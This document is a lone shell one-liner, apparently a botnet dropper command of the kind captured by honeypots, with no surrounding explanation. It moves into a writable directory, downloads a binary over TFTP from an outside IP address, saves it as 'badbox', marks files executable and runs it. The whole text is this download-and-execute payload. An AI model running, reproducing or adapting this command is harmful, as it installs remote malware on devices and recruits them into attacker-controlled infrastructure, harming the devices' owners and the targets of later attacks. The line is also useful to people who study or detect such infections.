cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 85.255.1.223 -c get telnetd;cat telnetd >badbox;chmod +x *;./badbox
